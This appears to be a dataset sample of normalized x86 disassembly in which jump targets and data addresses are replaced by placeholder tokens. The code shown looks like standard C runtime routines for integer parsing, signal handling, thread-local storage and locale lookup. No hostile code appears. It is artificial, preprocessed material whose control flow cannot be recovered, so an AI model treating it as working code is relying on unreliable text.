cmp bl 0x2b
jne r-xdata
or [ ebp + 0x18 ] 0x2
jmp r-xdata
cmp [ ecx + 0xac ] 0x1
jle r-xdata
mov eax [ ebp + 0x14 ]
test eax eax
js r-xdata
mov bl [ edi ]
inc edi
mov eax [ ebp + 0x10 ]
test eax eax
je r-xdata
cmp eax 0x1
je r-xdata
cmp [ ebp - 0x10 ] 0x0
je r-xdata
mov [ eax ] esi
cmp eax 0x24
jg r-xdata
xor eax eax
mov eax [ ebp - 0x14 ]
and [ eax + 0x70 ] 0xfffffffd
test eax eax
jne r-xdata
cmp eax 0x10
jne r-xdata
cmp bl 0x30
je r-xdata
or eax 0xffffffff
xor edx edx
div [ ebp + 0x14 ]
mov esi [ ecx + 0xc8 ]
mov [ ebp - 0x8 ] edx
cmp bl 0x30
jne r-xdata
mov al [ edi ]
cmp al 0x78
je r-xdata
mov [ ebp + 0x14 ] 0xa
jmp r-xdata
and ecx 0x103
je r-xdata
movsx ecx bl
sub ecx 0x30
jmp r-xdata
mov al [ edi ]
cmp al 0x78
je r-xdata
mov [ ebp + 0x14 ] 0x10
jmp r-xdata
cmp al 0x58
je r-xdata
mov eax [ ebp + 0x18 ]
dec edi
test al 0x8
jne r-xdata
lea ecx [ ebx - 0x61 ]
cmp cl 0x19
movsx ecx bl
ja r-xdata
cmp ecx [ ebp + 0x14 ]
jae r-xdata
mov bl [ edi + 0x1 ]
add edi 0x2
cmp al 0x58
jne r-xdata
mov [ ebp + 0x14 ] 0x8
jmp r-xdata
mov esi 0x7fffffff
test al 0x4
jne r-xdata
cmp [ ebp + 0x10 ] 0x0
je r-xdata
add ecx 0xffffffc9
sub ecx 0x20
or [ ebp + 0x18 ] 0x8
cmp [ ebp - 0x4 ] eax
jb r-xdata
call sub_40d1fa
test [ ebp + 0x18 ] 0x1
mov [ eax ] 0x22
je r-xdata
test al 0x1
jne r-xdata
and [ ebp - 0x4 ] 0x0
jmp r-xdata
mov edi [ ebp + 0xc ]
mov edx [ ebp - 0x4 ]
imul edx [ ebp + 0x14 ]
add edx ecx
mov [ ebp - 0x4 ] edx
jne r-xdata
test [ ebp + 0x18 ] 0x2
push 0x0
pop eax
setne al
add eax esi
mov [ ebp - 0x4 ] eax
or [ ebp - 0x4 ] 0xffffffff
jmp r-xdata
mov eax [ ebp + 0x10 ]
test eax eax
je r-xdata
and eax 0x2
je r-xdata
movzx ecx bl
movzx ecx [ esi + ecx * 2 ]
mov edx ecx
and edx 0x4
je r-xdata
or [ ebp + 0x18 ] 0x4
cmp [ ebp + 0x10 ] 0x0
jne r-xdata
cmp ecx [ ebp - 0x8 ]
jbe r-xdata
test [ ebp + 0x18 ] 0x2
je r-xdata
mov [ eax ] edi
test eax eax
jne r-xdata
cmp [ ebp - 0x4 ] 0x80000000
ja r-xdata
mov bl [ edi ]
inc edi
jmp r-xdata
cmp [ ebp - 0x10 ] 0x0
je r-xdata
neg [ ebp - 0x4 ]
cmp [ ebp - 0x4 ] esi
jbe r-xdata
mov eax [ ebp - 0x4 ]
jmp r-xdata
mov eax [ ebp - 0x14 ]
and [ eax + 0x70 ] 0xfffffffd
pop edi
pop ebx
sub_41160c
mov edi edi
push ebp
mov ebp esp
xor eax eax
push eax
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
cmp [ rwxdata ] eax
jne r-xdata
push eax
push rwxdata
jmp r-xdata
call sub_4113e1
add esp 0x14
pop ebp
retn
sub_411654
mov edi edi
push ebp
mov ebp esp
cmp [ rwxdata ] 0x0
push 0x1
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
jne r-xdata
push 0x0
push rwxdata
jmp r-xdata
call sub_4113e1
add esp 0x14
pop ebp
retn
sub_41169d
mov edi edi
push ebp
mov ebp esp
sub esp 0x3c
push ebx
push [ ebp + 0x8 ]
lea ecx [ ebp - 0x3c ]
call sub_40d831
mov ecx [ ebp + 0x10 ]
mov eax [ ebp + 0xc ]
xor ebx ebx
cmp ecx ebx
je r-xdata
cmp eax ebx
jne r-xdata
mov [ ecx ] eax
cmp [ ebp + 0x14 ] ebx
je r-xdata
call sub_40d1fa
mov [ eax ] 0x16
call sub_40e72d
cmp [ ebp - 0x30 ] bl
je r-xdata
mov cl [ eax ]
push esi
mov esi [ ebp - 0x3c ]
push edi
mov [ ebp - 0x14 ] ebx
mov [ ebp - 0x10 ] ebx
mov [ ebp - 0x1 ] cl
lea edi [ eax + 0x1 ]
cmp [ ebp + 0x14 ] 0x2
jl r-xdata
xor eax eax
xor edx edx
jmp r-xdata
mov eax [ ebp - 0x34 ]
and [ eax + 0x70 ] 0xfffffffd
movzx eax [ ebp - 0x1 ]
mov ecx [ esi + 0xc8 ]
movzx eax [ ecx + eax * 2 ]
and eax 0x8
lea eax [ ebp - 0x3c ]
push eax
movzx eax [ ebp - 0x1 ]
push 0x8
push eax
call sub_41813b
mov esi [ ebp - 0x3c ]
add esp 0xc
jmp r-xdata
cmp [ ebp + 0x14 ] 0x24
jg r-xdata
pop ebx
leave
retn
cmp [ ebp - 0x1 ] 0x2d
mov [ ebp - 0x8 ] edi
jne r-xdata
mov al [ edi ]
mov [ ebp - 0x1 ] al
inc edi
jmp r-xdata
cmp eax ebx
je r-xdata
cmp [ ebp - 0x1 ] 0x2b
jne r-xdata
or [ ebp + 0x18 ] 0x2
jmp r-xdata
cmp [ esi + 0xac ] 0x1
jle r-xdata
push 0x10
pop ecx
cmp [ ebp + 0x14 ] ebx
jne r-xdata
mov al [ edi ]
inc edi
mov [ ebp - 0x8 ] edi
mov [ ebp - 0x1 ] al
cmp [ ebp + 0x14 ] ecx
jne r-xdata
cmp [ ebp - 0x1 ] 0x30
je r-xdata
mov eax [ ebp + 0x14 ]
cdq
push edx
mov edi eax
push edi
push 0xffffffff
push 0xffffffff
mov [ ebp - 0x28 ] edx
call sub_4147b0
mov [ ebp - 0x20 ] ebx
mov ebx [ esi + 0xc8 ]
mov [ ebp - 0x24 ] ecx
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x18 ] edx
cmp [ ebp - 0x1 ] 0x30
jne r-xdata
mov al [ edi ]
cmp al 0x78
je r-xdata
mov [ ebp + 0x14 ] 0xa
jmp r-xdata
and eax 0x103
je r-xdata
movsx esi cl
sub esi 0x30
jmp r-xdata
mov al [ edi ]
cmp al 0x78
je r-xdata
mov [ ebp + 0x14 ] ecx
cmp al 0x58
je r-xdata
mov eax [ ebp + 0x18 ]
dec [ ebp - 0x8 ]
test al 0x8
jne r-xdata
lea eax [ ecx - 0x61 ]
cmp al 0x19
movsx eax cl
ja r-xdata
cmp esi [ ebp + 0x14 ]
jae r-xdata
mov al [ edi + 0x1 ]
add edi 0x2
mov [ ebp - 0x1 ] al
mov [ ebp - 0x8 ] edi
cmp al 0x58
jne r-xdata
mov [ ebp + 0x14 ] 0x8
jmp r-xdata
mov esi 0x7fffffff
mov ebx 0x80000000
test al 0x4
jne r-xdata
xor eax eax
cmp [ ebp + 0x10 ] eax
je r-xdata
lea esi [ eax - 0x37 ]
sub eax 0x20
mov ecx [ ebp - 0x10 ]
or [ ebp + 0x18 ] 0x8
cmp ecx [ ebp - 0x18 ]
jb r-xdata
call sub_40d1fa
test [ ebp + 0x18 ] 0x1
mov [ eax ] 0x22
je r-xdata
test al 0x1
jne r-xdata
mov [ ebp - 0x14 ] eax
mov [ ebp - 0x10 ] eax
jmp r-xdata
mov ecx [ ebp + 0xc ]
mov [ ebp - 0x8 ] ecx
push ecx
push [ ebp - 0x14 ]
push [ ebp - 0x28 ]
push edi
call sub_419180
xor ecx ecx
add eax esi
adc edx ecx
mov [ ebp - 0x14 ] eax
mov [ ebp - 0x10 ] edx
ja r-xdata
test [ ebp + 0x18 ] 0x2
je r-xdata
or [ ebp - 0x14 ] 0xffffffff
or [ ebp - 0x10 ] 0xffffffff
jmp r-xdata
mov eax [ ebp + 0x10 ]
pop edi
pop esi
test eax eax
je r-xdata
and eax 0x2
je r-xdata
mov cl [ ebp - 0x1 ]
movzx eax cl
movzx eax [ ebx + eax * 2 ]
mov edx eax
and edx 0x4
je r-xdata
mov eax [ ebp - 0x1c ]
cmp [ ebp - 0x14 ] eax
jne r-xdata
mov eax [ ebp - 0x14 ]
cmp eax [ ebp - 0x1c ]
jb r-xdata
or [ ebp - 0x14 ] 0xffffffff
mov [ ebp - 0x10 ] esi
and [ ebp - 0x14 ] 0x0
mov [ ebp - 0x10 ] ebx
jmp r-xdata
test [ ebp + 0x18 ] 0x2
je r-xdata
mov ecx [ ebp - 0x8 ]
mov [ eax ] ecx
test eax eax
jne r-xdata
cmp [ ebp - 0x10 ] ebx
ja r-xdata
or [ ebp + 0x18 ] 0x4
cmp [ ebp + 0x10 ] 0x0
jne r-xdata
cmp ecx [ ebp - 0x18 ]
jne r-xdata
cmp [ ebp - 0x30 ] 0x0
je r-xdata
mov eax [ ebp - 0x14 ]
mov ecx [ ebp - 0x10 ]
neg eax
adc ecx 0x0
neg ecx
mov [ ebp - 0x14 ] eax
mov [ ebp - 0x10 ] ecx
cmp [ ebp - 0x10 ] esi
jb r-xdata
jb r-xdata
mov eax [ ebp - 0x8 ]
mov al [ eax ]
inc [ ebp - 0x8 ]
mov [ ebp - 0x1 ] al
jmp r-xdata
xor eax eax
cmp eax [ ebp - 0x20 ]
jb r-xdata
mov eax [ ebp - 0x14 ]
mov edx [ ebp - 0x10 ]
mov eax [ ebp - 0x34 ]
and [ eax + 0x70 ] 0xfffffffd
ja r-xdata
cmp [ ebp - 0x14 ] 0x0
ja r-xdata
ja r-xdata
cmp [ ebp - 0x14 ] 0xffffffff
jbe r-xdata
cmp esi [ ebp - 0x24 ]
jbe r-xdata
sub_41193a
mov edi edi
push ebp
mov ebp esp
xor eax eax
push eax
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
cmp [ rwxdata ] eax
jne r-xdata
push eax
push rwxdata
jmp r-xdata
call sub_41169d
add esp 0x14
pop ebp
retn
sub_411982
mov edi edi
push ebp
mov ebp esp
cmp [ rwxdata ] 0x0
push 0x1
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
jne r-xdata
push 0x0
push rwxdata
jmp r-xdata
call sub_41169d
add esp 0x14
pop ebp
retn
sub_4119cb
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
push edi
push esi
call sub_417abe
pop ecx
cmp eax 0xffffffff
je r-xdata
xor edi edi
mov eax [ rwxdata ]
cmp esi 0x1
jne r-xdata
xor eax eax
push edi
call sub_40d220
pop ecx
or eax 0xffffffff
jmp r-xdata
cmp esi 0x2
jne r-xdata
test [ eax + 0x84 ] 0x1
jne r-xdata
pop edi
pop esi
pop ebp
retn
push esi
call sub_417abe
pop ecx
push eax
call [ CloseHandle@IAT ]
test eax eax
jne r-xdata
test [ eax + 0x44 ] 0x1
je r-xdata
push 0x2
call sub_417abe
push 0x1
mov edi eax
call sub_417abe
pop ecx
pop ecx
cmp eax edi
je r-xdata
call [ GetLastError@IAT ]
mov edi eax
jmp r-xdata
push esi
call sub_417a38
mov eax esi
sar eax 0x5
mov eax [ eax * 4 + rwxdata ]
and esi 0x1f
shl esi 0x6
pop ecx
mov [ eax + esi + 0x4 ] 0x0
test edi edi
je r-xdata
sub_411a67
push 0x10
push r--data
call sub_40f510
mov ebx [ ebp + 0x8 ]
cmp ebx 0xfffffffe
jne r-xdata
test ebx ebx
js r-xdata
call sub_40d20d
and [ eax ] 0x0
call sub_40d1fa
mov [ eax ] 0x9
call sub_40d20d
and [ eax ] 0x0
call sub_40d1fa
mov [ eax ] 0x9
call sub_40e72d
jmp r-xdata
cmp ebx [ rwxdata ]
jb r-xdata
call sub_40f555
retn
or eax 0xffffffff
jmp r-xdata
mov eax ebx
sar eax 0x5
lea edi [ eax * 4 + rwxdata ]
mov esi ebx
and esi 0x1f
shl esi 0x6
mov eax [ edi ]
movsx eax [ eax + esi + 0x4 ]
and eax 0x1
je r-xdata
push ebx
call sub_417b27
pop ecx
and [ ebp - 0x4 ] 0x0
mov eax [ edi ]
test [ eax + esi + 0x4 ] 0x1
je r-xdata
call sub_40d1fa
mov [ eax ] 0x9
or [ ebp - 0x1c ] 0xffffffff
push ebx
call sub_4119cb
pop ecx
mov [ ebp - 0x1c ] eax
jmp r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_411b23
mov eax [ ebp - 0x1c ]
sub_411b2b
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
mov eax [ esi + 0xc ]
test al 0x83
je r-xdata
pop esi
pop ebp
retn
test al 0x8
je r-xdata
push [ esi + 0x8 ]
call sub_40b955
and [ esi + 0xc ] 0xfffffbf7
xor eax eax
pop ecx
mov [ esi ] eax
mov [ esi + 0x8 ] eax
mov [ esi + 0x4 ] eax
sub_411c0f
push 0x10
push r--data
call sub_40f510
xor edi edi
push edi
call sub_40f40a
pop ecx
mov [ ebp - 0x4 ] edi
cmp [ ebp + 0x8 ] edi
jne r-xdata
mov esi rwxdata
push [ rwxdata ]
call [ DecodePointer@IAT ]
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x20 ] 0x15
mov esi rwxdata
push [ rwxdata ]
call [ DecodePointer@IAT ]
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x20 ] 0x2
jmp r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_411c8b
cmp [ ebp - 0x1c ] edi
jne r-xdata
cmp eax 0x1
je r-xdata
cmp eax edi
je r-xdata
cmp [ ebp - 0x1c ] 0x1
je r-xdata
xor eax eax
jmp r-xdata
call sub_41239e
mov [ esi ] eax
xor eax eax
inc eax
push [ ebp - 0x20 ]
call [ ebp - 0x1c ]
pop ecx
call sub_40f555
retn 0x4
sub_411cab
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov ecx [ r--data ]
push esi
imul ecx ecx 0xc
add ecx [ ebp + 0x8 ]
pop esi
cmp eax ecx
jae r-xdata
mov esi ecx
imul esi esi 0xc
add esi [ ebp + 0x8 ]
add eax 0xc
cmp eax esi
jb r-xdata
xor eax eax
cmp [ eax + 0x4 ] edx
je r-xdata
cmp [ eax + 0x4 ] edx
je r-xdata
pop ebp
retn
sub_411d01
push 0x10
push r--data
call sub_40f510
and [ ebp - 0x20 ] 0x0
mov esi [ ebp + 0xc ]
mov ebx [ ebp + 0x8 ]
cmp esi 0x4
je r-xdata
cmp ebx 0x1
je r-xdata
cmp esi 0x3
je r-xdata
or eax 0xffffffff
cmp ebx 0x3
je r-xdata
push 0x2
pop edi
cmp ebx edi
je r-xdata
cmp ebx 0xd
je r-xdata
push 0x0
call sub_40f40a
pop ecx
and [ ebp - 0x4 ] 0x0
cmp ebx edi
je r-xdata
cmp ebx 0x15
je r-xdata
cmp ebx 0xf
jle r-xdata
cmp [ rwxdata ] 0x0
jne r-xdata
cmp ebx 0x15
jne r-xdata
cmp ebx 0x16
je r-xdata
call sub_40d1fa
mov [ eax ] 0x16
call sub_40e72d
cmp ebx 0x11
jle r-xdata
mov eax ebx
sub eax edi
je r-xdata
push 0x1
push sub_411c0f
call [ SetConsoleCtrlHandler@IAT ]
xor ecx ecx
inc ecx
cmp eax ecx
jne r-xdata
cmp ebx 0x6
je r-xdata
push [ rwxdata ]
call [ DecodePointer@IAT ]
mov [ ebp - 0x1c ] eax
cmp esi edi
je r-xdata
sub eax 0x4
je r-xdata
call sub_40d20d
mov esi eax
call [ GetLastError@IAT ]
mov [ esi ] eax
mov [ ebp - 0x20 ] 0x1
mov esi [ ebp + 0xc ]
mov [ rwxdata ] ecx
jmp r-xdata
cmp ebx 0xf
je r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_411f06
cmp [ ebp - 0x20 ] 0x0
jne r-xdata
push esi
call [ EncodePointer@IAT ]
mov [ rwxdata ] eax
push [ rwxdata ]
call [ DecodePointer@IAT ]
mov [ ebp - 0x1c ] eax
cmp esi edi
je r-xdata
sub eax 0x9
je r-xdata
cmp ebx 0x8
je r-xdata
mov eax [ ebp - 0x1c ]
jmp r-xdata
push esi
call [ EncodePointer@IAT ]
mov [ rwxdata ] eax
jmp r-xdata
push [ rwxdata ]
call [ DecodePointer@IAT ]
mov [ ebp - 0x1c ] eax
cmp esi edi
je r-xdata
sub eax 0x6
je r-xdata
call sub_412512
mov esi eax
test esi esi
je r-xdata
cmp ebx 0x4
je r-xdata
call sub_40f555
retn
push esi
call [ EncodePointer@IAT ]
mov [ rwxdata ] eax
jmp r-xdata
push [ rwxdata ]
call [ DecodePointer@IAT ]
mov [ ebp - 0x1c ] eax
cmp esi edi
je r-xdata
dec eax
jne r-xdata
mov edi r--data
cmp [ esi + 0x5c ] edi
jne r-xdata
cmp ebx 0xb
jne r-xdata
push esi
call [ EncodePointer@IAT ]
mov [ rwxdata ] eax
jmp r-xdata
push [ esi + 0x5c ]
mov edx ebx
call sub_411cab
pop ecx
test eax eax
je r-xdata
push [ r--data ]
call sub_40eec5
pop ecx
mov [ esi + 0x5c ] eax
test eax eax
je r-xdata
mov ecx [ eax + 0x8 ]
mov [ ebp - 0x1c ] ecx
mov ecx [ ebp + 0xc ]
cmp ecx 0x2
je r-xdata
push [ r--data ]
push edi
push eax
call sub_411080
add esp 0xc
add eax 0x4
jmp r-xdata
cmp [ eax ] ebx
je r-xdata
mov [ eax + 0x4 ] ecx
add eax 0xc
mov edx [ r--data ]
imul edx edx 0xc
add edx [ esi + 0x5c ]
lea edi [ eax - 0x4 ]
cmp edi edx
jae r-xdata
jmp r-xdata
sub_411f41
push 0x20
push r--data
call sub_40f510
xor edi edi
mov [ ebp - 0x1c ] edi
mov [ ebp - 0x28 ] edi
mov ebx [ ebp + 0x8 ]
cmp ebx 0xb
jg r-xdata
mov eax ebx
sub eax 0xf
je r-xdata
je r-xdata
mov esi rwxdata
mov eax [ rwxdata ]
sub eax 0x6
je r-xdata
call sub_412512
mov edi eax
mov [ ebp - 0x28 ] edi
test edi edi
jne r-xdata
mov eax ebx
push 0x2
pop ecx
sub eax ecx
je r-xdata
call sub_40f555
retn
cmp [ ebp - 0x20 ] eax
jne r-xdata
mov esi rwxdata
mov eax [ rwxdata ]
jmp r-xdata
dec eax
je r-xdata
push [ edi + 0x5c ]
mov edx ebx
call sub_411cab
pop ecx
lea esi [ eax + 0x8 ]
mov eax [ esi ]
jmp r-xdata
or eax 0xffffffff
jmp r-xdata
mov esi rwxdata
mov eax [ rwxdata ]
jmp r-xdata
sub eax ecx
je r-xdata
cmp [ ebp - 0x1c ] eax
je r-xdata
push 0x3
call sub_40ce79
mov [ ebp - 0x1c ] 0x1
push eax
call [ DecodePointer@IAT ]
mov esi rwxdata
mov eax [ rwxdata ]
jmp r-xdata
call sub_40d1fa
mov [ eax ] 0x16
call sub_40e72d
jmp r-xdata
mov [ ebp - 0x20 ] eax
xor eax eax
cmp [ ebp - 0x20 ] 0x1
je r-xdata
sub eax ecx
je r-xdata
xor eax eax
mov [ ebp - 0x4 ] eax
cmp ebx 0x8
je r-xdata
push eax
call sub_40f40a
pop ecx
sub eax ecx
jne r-xdata
mov ecx [ edi + 0x60 ]
mov [ ebp - 0x2c ] ecx
mov [ edi + 0x60 ] eax
cmp ebx 0x8
jne r-xdata
cmp ebx 0xb
je r-xdata
call sub_41239e
mov [ esi ] eax
mov ecx [ edi + 0x64 ]
mov [ ebp - 0x30 ] ecx
mov [ edi + 0x64 ] 0x8c
cmp ebx 0x4
jne r-xdata
push ebx
call [ ebp - 0x20 ]
push [ edi + 0x64 ]
push ebx
call [ ebp - 0x20 ]
pop ecx
jmp r-xdata
mov ecx [ r--data ]
mov [ ebp - 0x24 ] ecx
cmp ebx 0x8
jne r-xdata
mov eax [ ebp - 0x2c ]
mov [ edi + 0x60 ] eax
cmp ebx 0x8
jne r-xdata
cmp ebx 0xb
je r-xdata
pop ecx
cmp ebx 0x8
je r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_4120a8
cmp ebx 0x8
jne r-xdata
mov ecx [ ebp - 0x24 ]
imul ecx ecx 0xc
mov edx [ edi + 0x5c ]
mov [ ecx + edx + 0x8 ] eax
inc [ ebp - 0x24 ]
jmp r-xdata
xor eax eax
mov eax [ ebp - 0x30 ]
mov [ edi + 0x64 ] eax
cmp ebx 0x4
jne r-xdata
mov ecx [ r--data ]
add ecx [ r--data ]
cmp [ ebp - 0x24 ] ecx
jge r-xdata
sub_4120f3
mov edi edi
push ebp
mov ebp esp
push ecx
push esi
push [ rwxdata ]
call [ DecodePointer@IAT ]
mov esi eax
mov eax [ ebp + 0x8 ]
test eax eax
jne r-xdata
and [ eax ] 0x0
push edi
test esi esi
jne r-xdata
call sub_40d1fa
push 0x16
pop esi
mov [ eax ] esi
call sub_40e72d
mov eax esi
jmp r-xdata
push 0x4
push [ ebp + 0x8 ]
call esi
test eax eax
jne r-xdata
push r--data
call [ LoadLibraryW@IAT ]
mov [ ebp - 0x4 ] eax
test eax eax
jne r-xdata
pop esi
leave
retn
xor eax eax
call sub_40d1fa
mov [ eax ] 0xc
call sub_40d1fa
mov eax [ eax ]
jmp r-xdata
push r--data
push eax
call [ GetProcAddress@IAT ]
mov esi eax
test esi esi
jne r-xdata
call sub_40d1fa
push 0x16
pop esi
mov [ eax ] esi
call sub_40e72d
mov eax esi
jmp r-xdata
pop edi
push ebx
push esi
call [ EncodePointer@IAT ]
mov edi eax
call sub_41239e
push edi
push rwxdata
mov ebx eax
call [ InterlockedExchange@IAT ]
cmp eax ebx
pop ebx
je r-xdata
call sub_40d1fa
mov esi [ GetLastError@IAT ]
mov edi eax
call esi
push eax
call sub_40d1b8
pop ecx
mov [ edi ] eax
call sub_40e72d
call esi
push eax
call sub_40d1b8
pop ecx
jmp r-xdata
push [ ebp - 0x4 ]
call [ FreeLibrary@IAT ]
sub_4121e3
mov edi edi
push ebp
mov ebp esp
sub esp 0x90
mov eax [ rwxdata ]
xor eax ebp
mov [ ebp - 0x4 ] eax
cmp [ ebp + 0xc ] 0x1
mov eax [ ebp + 0x8 ]
push ebx
push esi
push edi
mov edi [ ebp + 0x18 ]
mov [ ebp - 0x88 ] eax
jne r-xdata
cmp [ ebp + 0xc ] 0x2
jne r-xdata
and [ ebp - 0x8c ] 0x0
push 0x80
lea ebx [ ebp - 0x84 ]
mov ecx ebx
push ecx
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push eax
call sub_4193cd
mov esi eax
add esp 0x14
test esi esi
jne r-xdata
cmp [ ebp + 0xc ] 0x0
jne r-xdata
mov esi [ GetLocaleInfoW@IAT ]
xor eax eax
push eax
push eax
push [ ebp + 0x14 ]
mov [ edi ] eax
push [ ebp + 0x10 ]
call esi
mov ebx eax
test ebx ebx
je r-xdata
push 0x1
push esi
call sub_40ef0a
mov [ edi ] eax
xor edi edi
pop ecx
pop ecx
cmp eax edi
jne r-xdata
call [ GetLastError@IAT ]
cmp eax 0x7a
jne r-xdata
or eax 0xffffffff
and [ ebp - 0x88 ] 0x0
push 0x2
lea eax [ ebp - 0x88 ]
push eax
mov eax [ ebp + 0x14 ]
or eax 0x20000000
push eax
push [ ebp + 0x10 ]
call [ GetLocaleInfoW@IAT ]
test eax eax
je r-xdata
push [ edi ]
call sub_40b955
and [ edi ] 0x0
pop ecx
jmp r-xdata
push 0x2
push ebx
call sub_40ef0a
pop ecx
pop ecx
mov [ edi ] eax
test eax eax
je r-xdata
lea ecx [ esi - 0x1 ]
push ecx
push ebx
push esi
push eax
call sub_419208
add esp 0x10
test eax eax
jne r-xdata
cmp [ ebp - 0x8c ] edi
je r-xdata
push esi
push esi
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp - 0x88 ]
call sub_4193cd
add esp 0x14
mov [ ebp - 0x90 ] eax
test eax eax
je r-xdata
mov al [ ebp - 0x88 ]
mov [ edi ] al
jmp r-xdata
push ebx
push eax
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
call esi
test eax eax
jne r-xdata
push edi
push edi
push edi
push edi
push edi
call sub_40e6c1
cmp [ ebp - 0x8c ] edi
je r-xdata
push ebx
call sub_40b955
pop ecx
inc esi
push esi
push eax
call sub_40ef0a
mov ebx eax
pop ecx
pop ecx
test ebx ebx
je r-xdata
xor eax eax
jmp r-xdata
push ebx
call sub_40b955
pop ecx
push [ ebp - 0x90 ]
mov [ ebp - 0x8c ] esi
push ebx
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp - 0x88 ]
call sub_4193cd
mov esi eax
add esp 0x14
test esi esi
je r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_40b946
leave
retn
sub_4123d0
mov edi edi
push esi
push [ rwxdata ]
call [ TlsGetValue@IAT ]
mov esi eax
test esi esi
jne r-xdata
mov eax esi
pop esi
retn
push [ rwxdata ]
call [ DecodePointer@IAT ]
mov esi eax
push esi
push [ rwxdata ]
call [ TlsSetValue@IAT ]
sub_412421
mov eax [ rwxdata ]
cmp eax 0xffffffff
je r-xdata
mov eax [ rwxdata ]
cmp eax 0xffffffff
je r-xdata
push eax
push [ rwxdata ]
call [ DecodePointer@IAT ]
call eax
or [ rwxdata ] 0xffffffff
jmp sub_40f2c2
push eax
call [ TlsFree@IAT ]
or [ rwxdata ] 0xffffffff
sub_41245e
push 0x8
push r--data
call sub_40f510
push r--data
call [ GetModuleHandleW@IAT ]
mov esi [ ebp + 0x8 ]
mov [ esi + 0x5c ] r--data
and [ esi + 0x8 ] 0x0
xor edi edi
inc edi
mov [ esi + 0x14 ] edi
mov [ esi + 0x70 ] edi
mov [ esi + 0xc8 ] 0x43
mov [ esi + 0x14b ] 0x43
mov [ esi + 0x68 ] rwxdata
push 0xd
call sub_40f40a
pop ecx
and [ ebp - 0x4 ] 0x0
push [ esi + 0x68 ]
call [ InterlockedIncrement@IAT ]
mov [ ebp - 0x4 ] 0xfffffffe
call sub_412500
push 0xc
call sub_40f40a
pop ecx
mov [ ebp - 0x4 ] edi
mov eax [ ebp + 0xc ]
mov [ esi + 0x6c ] eax
test eax eax
jne r-xdata
push [ esi + 0x6c ]
call sub_413fc5
pop ecx
mov [ ebp - 0x4 ] 0xfffffffe
call sub_412509
call sub_40f555
retn
mov eax [ rwxdata ]
mov [ esi + 0x6c ] eax
sub_412512
mov edi edi
push esi
push edi
call [ GetLastError@IAT ]
push [ rwxdata ]
mov edi eax
call sub_4123d0
call eax
mov esi eax
test esi esi
jne r-xdata
push edi
call [ SetLastError@IAT ]
pop edi
mov eax esi
pop esi
retn
push 0x214
push 0x1
call sub_40ef0a
mov esi eax
pop ecx
pop ecx
test esi esi
je r-xdata
push esi
push [ rwxdata ]
push [ rwxdata ]
call [ DecodePointer@IAT ]
call eax
test eax eax
je r-xdata
push esi
call sub_40b955
pop ecx
xor esi esi
push 0x0
push esi
call sub_41245e
pop ecx
pop ecx
call [ GetCurrentThreadId@IAT ]
or [ esi + 0x4 ] 0xffffffff
mov [ esi ] eax
jmp r-xdata
sub_4125a5
push 0x8
push r--data
call sub_40f510
mov esi [ ebp + 0x8 ]
test esi esi
je r-xdata
call sub_40f555
retn 0x4
mov eax [ esi + 0x24 ]
test eax eax
je r-xdata
mov eax [ esi + 0x2c ]
test eax eax
je r-xdata
push eax
call sub_40b955
pop ecx
mov eax [ esi + 0x34 ]
test eax eax
je r-xdata
push eax
call sub_40b955
pop ecx
mov eax [ esi + 0x3c ]
test eax eax
je r-xdata
push eax
call sub_40b955
pop ecx
mov eax [ esi + 0x40 ]
test eax eax
je r-xdata
push eax
call sub_40b955
pop ecx
mov eax [ esi + 0x44 ]
test eax eax
je r-xdata
push eax
call sub_40b955
pop ecx
mov eax [ esi + 0x48 ]
test eax eax
je r-xdata
push eax
call sub_40b955
pop ecx
mov eax [ esi + 0x5c ]
cmp eax r--data
je r-xdata
push eax
call sub_40b955
pop ecx
push 0xd
call sub_40f40a
pop ecx
and [ ebp - 0x4 ] 0x0
mov edi [ esi + 0x68 ]
test edi edi
je r-xdata
push eax
call sub_40b955
pop ecx
mov [ ebp - 0x4 ] 0xfffffffe
call sub_4126bf
push 0xc
call sub_40f40a
pop ecx
mov [ ebp - 0x4 ] 0x1
mov edi [ esi + 0x6c ]
test edi edi
je r-xdata
push edi
call [ InterlockedDecrement@IAT ]
test eax eax
jne r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_4126cb
push esi
call sub_40b955
pop ecx
push edi
call sub_414054
pop ecx
cmp edi [ rwxdata ]
je r-xdata
cmp edi rwxdata
je r-xdata
cmp edi rwxdata
je r-xdata
push edi
call sub_40b955
pop ecx
cmp [ edi ] 0x0
jne r-xdata
push edi
call sub_4140ed
pop ecx
sub_4126d4
mov edi edi
push ebp
mov ebp esp
cmp [ rwxdata ] 0xffffffff
je r-xdata
mov eax [ rwxdata ]
cmp eax 0xffffffff
je r-xdata
cmp [ ebp + 0x8 ] 0x0
jne r-xdata
pop ebp
retn
push 0x0
push eax
call [ TlsSetValue@IAT ]
push 0x0
push [ rwxdata ]
push [ rwxdata ]
call [ DecodePointer@IAT ]
call eax
push [ ebp + 0x8 ]
call sub_4125a5
push esi
push [ rwxdata ]
mov esi [ TlsGetValue@IAT ]
call esi
test eax eax
je r-xdata
pop esi
push [ rwxdata ]
push [ rwxdata ]
call esi
call eax
mov [ ebp + 0x8 ] eax
sub_41274e
mov edi edi
push edi
push r--data
call [ GetModuleHandleW@IAT ]
mov edi eax
test edi edi
jne r-xdata
push esi
mov esi [ GetProcAddress@IAT ]
push r--data
push edi
call esi
push r--data
push edi
mov [ rwxdata ] eax
call esi
push r--data
push edi
mov [ rwxdata ] eax
call esi
